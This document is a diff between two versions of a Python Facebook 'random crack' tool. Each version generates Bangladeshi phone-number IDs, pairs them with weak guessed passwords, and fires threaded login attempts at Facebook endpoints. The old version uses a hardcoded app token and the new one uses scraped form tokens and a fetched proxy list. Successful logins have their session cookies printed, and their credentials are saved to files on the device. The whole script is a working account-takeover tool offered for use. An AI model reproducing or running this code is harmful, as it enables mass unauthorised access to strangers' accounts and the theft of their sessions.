@@ -1,42 +1,81 @@
-import os
-import time
-import sys
-from os import path
-import urllib
-import pip
-import base64
-import zlib
+import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
+import requests as ress
+from datetime import date
+from datetime import datetime
+from time import sleep
+from os import system as s
+from time import sleep as waktu
 try:
-        import os,requests,json,time,re,random,sys,uuid,string,subprocess
-        from string import *
-        from concurrent.futures import ThreadPoolExecutor as tred
+    import requests
+    from concurrent.futures import ThreadPoolExecutor as ThreadPool
+    import mechanize
+    from requests.exceptions import ConnectionError
 except ModuleNotFoundError:
-        os.system(f'pip install requests futures==2 > /dev/null')
-except:pass
-#--------------------- [ SEX ] -------------------#
-model2 = requests.get('https://gist.githubusercontent.com/Nox-Naved/0588acb2b77932048a251d50a973029b/raw/f6de01ac684131b5353854ee114880fb00227cee/Model60').text.splitlines()
-jan = []
-loop=0
-oks=[]
-cps=[]
-twf=[]
-
-def randBuildLSB():
-    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
-    VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/FB4A;FBAV/230.0.0.36.117;FBBV/162942669;FBDM/{density=2.0,width=720,height=1456};FBLC/en_US;FBRV/382083935;FBCR/Banglalink;FBBD/Realme;FBPN/com.facebook.katana;FBDV/RMX1945;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
-    ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
-    return ua
-
-#--------------------- [ CODE ] -------------------#
-W='\033[1;37m' #WHITE
-G='\033[38;5;46m'
-F='\033[38;5;45m'
-R='\033[38;5;196m'
-#--------------------- [ LOGO ] -------------------#
-fuck = """
+    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
+    os.system('pip install bs4')
+RED = '\033[1;91m'
+WHITE = '\033[1;97m'
+GREEN = '\033[1;32m' 
+YELLOW = '\033[1;33m'
+BLUE = '\033[1;34m'
+ORANGE = '\033[1;35m'
+P = '\x1b[1;97m' 
+M = '\x1b[1;91m' 
+H = '\x1b[1;92m' 
+K = '\x1b[1;93m' 
+B = '\x1b[1;94m' 
+U = '\x1b[1;95m' 
+O = '\x1b[1;96m' 
+N = '\x1b[0m'    
+A = '\x1b[1;90m' 
+BN = '\x1b[1;107m' 
+BBL = '\x1b[1;106m' 
+BP = '\x1b[1;105m' 
+BB = '\x1b[1;104m' 
+BK = '\x1b[1;103m' 
+BH = '\x1b[1;102m' 
+BM = '\x1b[1;101m' 
+BA = '\x1b[1;100m' 
+now = datetime.now()
+dt_string = now.strftime("%H:%M")
+current = datetime.now()
+ta = current.year
+bu = current.month
+ha = current.day
+today = date.today() 
+loop = 0
+oks = []
+cps = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+try:
+ prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
+ open('.prox.txt','w').write(prox)
+except Exception as e:
+ print('')
+prox=open('.prox.txt','r').read().splitlines()
+for xd in range(10000):
+    a='Nokia'
+    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    c=random.randrange(1, 99)
+    d='/GoBrowser/'
+    e='1.6.0.'
+    f=random.randrange(1, 99)
+    uaku2=(f'{a}{b}{c}{d}{e}{f}')
+    ugen.append(uaku2)
+    
+def __init__(self):
+        self.id = []
+        self.ok = []
+        self.cp = []
+        self.loop = 0
+        
+logo = ("""
 \033[38;5;45m      ___           ___           ___                               
 \033[38;5;45m    /\  \         /\  \         /\                       _____    
 \033[38;5;45m    |::\  \        \:\  \        \:\  \       ___         /::\  \   
@@ -47,151 +86,141 @@ fuck = """
 \033[38;5;45m  \:\  \        \:\  /:/  /   \::/__/       ~~\:\/\__\  \:\  /:/  / 
 \033[38;5;45m   \:\  \        \:\/:/  /     \:\  \          \::/  /   \:\/:/  /  
 \033[38;5;45m    \:\__\        \::/  /       \:\__\         /:/  /     \::/  /   
-\033[38;5;45m     \/__/         \/__/         \/__/         \/__/       \/__/    
-===================================
-=================================== """
-#--------------------- [ DEF-LOGO X CLEAR ] -------------------#
-def x():
+\033[38;5;45m     \/__/         \/__/         \/__/         \/__/       \/__/  """)
+
+logo1 = ("""
+\033[38;5;45m      ___           ___           ___                               
+\033[38;5;45m    /\  \         /\  \         /\                       _____    
+\033[38;5;45m    |::\  \        \:\  \        \:\  \       ___         /::\  \   
+\033[38;5;45m   |:|:\  \        \:\  \        \:\  \     /\__\       /:/\:\  \  
+\033[38;5;45m __|:|\:\  \   ___  \:\  \   ___ /::\  \   /:/__/      /:/  \:\__\ 
+\033[38;5;45m /::::|_\:\__\ /\  \  \:\__\ /\  /:/\:\__\ /::\  \     /:/__/ \:|__|
+\033[38;5;45m \:\~~\  \/__/ \:\  \ /:/  / \:\/:/  \/__/ \/\:\  \__  \:\  \ /:/  /
+\033[38;5;45m  \:\  \        \:\  /:/  /   \::/__/       ~~\:\/\__\  \:\  /:/  / 
+\033[38;5;45m   \:\  \        \:\/:/  /     \:\  \          \::/  /   \:\/:/  /  
+\033[38;5;45m    \:\__\        \::/  /       \:\__\         /:/  /     \::/  /   
+\033[38;5;45m     \/__/         \/__/         \/__/         \/__/       \/__/  """)
+
+def MUHIDehc():
+	print('==================================================')
+
+def Main():
+        os.system("clear")
+        print(logo)
+        print(" [1] RANDOM CRACK")
+        print(" [0] Exit")
+        MUHID =input("\n [?] Choices : ")
+        if MUHID in ["1"]:
+            fuck()
+        if MUHID in [" 0", "00"]:
+            exit()
+        else:
+            exit()
+            
+def fuck():
+    user=[]
     os.system('clear')
-    print(fuck)
-#--------------------- [ DEF-XNXX ] -------------------#
-def xnxx():
-    print(f'{W}===================================')
-#--------------------- [ MAIN ] -------------------#
-def MUHIDxx():
-    x()
-    print('[1] RNDM CRACK')
-    print('[2] EXIT');xnxx()
-    xtx = input('[?] CHOICE : ')
-    if xtx in '1':
-        rndmx()
-    elif xtx in '2':
-        print('Allah hafiz ')
-        os.system('exit')
-#--------------------- [ RNDM ] -------------------#
-def rndmx():
-    x()
-    print('[+] BD SIM CODE : 017,019,018,016 ');xnxx()
-    dog = input('[?] CODE : ')
-    x()
-    try:
-        print('[+] LIMIT : 999,9999,99999');xnxx()
-        limit = int(input('[?] LIMIT : '))
-    except ValueError:
-            limit = 5000
+    print(logo)
+    print('[+] EXAMPLE CODE: 017, 018, 019, 016')
+    code = input('[?] CHOOSE CODE : ')
+    name = ''.join(random.choice(string.digits) for _ in range(2))
+    cod = ''.join(random.choice(string.digits) for _ in range(2))
+    os.system('clear')
+    print(logo)
+    print('[+] EXAMPLE: 2000 3000 5000 10000 ')
+    limit = int(input('[?] CHOOSE : '))
     for nmbr in range(limit):
-            xxx = ''.join(random.choice(string.digits) for _ in range(8))
-            jan.append(xxx)
-    with tred(max_workers=30) as tanox:
-            x()
-            tl = str(len(jan))
-            print(f'[+] TOTAL UID : {str(len(jan))}')
-            print(f'[+] USE JAPAN APN COMING MORE OK IDS.......');xnxx()
-            for psx in jan:
-                ids = dog+psx
-                passlist = [psx,ids,ids[:8],ids[:7],'bangla']
-                tanox.submit(sexx,ids,passlist)
-    xnxx()
-    print(f'[+] TOTAL OK -{str(len(oks))}')
-    xnxx()
-#--------------------- [ MTHD ] -------------------#
-def sexx(ids,passlist):
-        global loop
-        global oks
-        sys.stdout.write(f'\r\r[+] [MUHID FIND] [{loop}] [OK:-{len(oks)}]')
-        sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        cat = {
-                        
-                        
-                        
-                        
-                        
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':ids,
-                                'password':pas,
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',                              
-                                'error_detail_type':'button_with_disabled',                                
-                                'enroll_misauth':'false',                             
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'fb_api_req_friendly_name':'authenticate',
-                        }
-                        
-                        
-                        
-                        
-                        
-                        MUHID={
-                        
-                        
-                        
-                        
-                        
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent': randBuildLSB(),
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                                
-                                
-                                
-                                
-                                
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=cat,headers=MUHID).json()
-                        if 'session_key' in po:
-                                try:
-                                        uid = po['uid']
-                                except:
-                                        uid = ids
-                                if str(uid) in oks:
-                                        break
-                                else:
-                                        print(f'\r\r\033[38;5;46m[+] [MUHID-OK] {str(uid)} \_/ {pas} ')
-                                        fxxk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        print(f'=COOKIE= : {fxxk}')
-                                        open('/sdcard/X-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        oks.append(str(uid))
-                                        break
-                        elif twf in str(po):
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                except:
-                                        uid = idf
-                                if uid in oks:pass
-                                else:
-                                        print(f'\r\r\033[38;5;45m[+] [MUHID-2F] {uid} \_/ {pas}\033[1;37m')
-                                        open('/sdcard/X-2F.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        twf.append(str(uid))
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                except:
-                                        uid = ids
-                                if uid in oks:pass
-                                else:
-                                        print('\r\r\033[38;5m196m[+] [MUHID-CP] '+str(uid)+' \_/ '+pas+'\033[1;37m')
-                                        open('/sdcard/X-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        cps.append(str(ids))
-                                        break
-                        else:continue
-                loop+=1
-        except Exception as e:
-                pass
-#--------------------- [ END ] -------------------#
-MUHIDxx()
+        nmp = ''.join(random.choice(string.digits) for _ in range(4))
+        user.append(nmp)
+    with ThreadPool(max_workers=30) as yaari:
+        os.system('clear')
+        print(logo1)
+        tl = str(len(user))
+        print('[+] Total ids: '+tl)
+        print("[+] Your Code: "+code)
+        print('[+] Process has been started')
+        print('[+] Use flight mode for speed up')
+        print('==================================================')
+        for love in user:
+            uid = code+name+cod+love
+            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'freefire','sadiya123','freefire2023','gamingfarhan']
+            yaari.submit(mumit2,uid,pwx,tl)
+    print('==================================================')
+    print(' [+] Crack process has been completed')
+    print(' [+] OK Ids saved in MUHID/OK.txt')
+    print(' [+] CP Ids saved in MUHID/CP.txt')
+    print('==================================================')
+def mumit2(uid,pwx,tl):
+    global loop
+    global cps
+    global oks
+    global proxy
+    try:
+        for ps in pwx:
+            pro = random.choice(ugen)
+            session = requests.Session()
+            sys.stdout.write('\r\033[1;92m[MUHID]--[%s/%s]--[CP-%s]~[OK-%s] \r'%(loop,tl,len(cps),len(oks))),
+            sys.stdout.flush()
+            free_fb = session.get('https://mbasic.facebook.com').text
+            log_data = {
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            "try_number":"0",
+            "unrecognized_tries":"0",
+            "email":uid,
+            "pass":ps,
+            "login":"Log In"}
+            header_freefb = {'authority': 'mbasic.facebook.com',
+    'method':'GET',
+    'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
+    'scheme':'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '2.25',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"Micromax B5 Pro"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"8.1.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
+            log_cookies=session.cookies.get_dict().keys()
+            if 'c_user' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[7:22]
+                print(f"""\033[1;92m[MUHID-OK] ✅
+Username : {uid} 
+Password : {ps} 
+\nCookie : {coki}
+""")
+#____cp____info 👇👇
+                open('/sdcard/MUHID/OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
+                break
+            elif 'checkpoint' in log_cookies:
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+                cid = coki[82:97]
+                print(f"""\033[1;91m[MUHID-CP] 
+Username : {cid}
+Password : {ps}
+""")
+                open('/sdcard/MUHID-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                cps.append(uid)
+                break
+            else:
+                continue
+        loop+=1
+    except:
+        pass
+        
+Main()
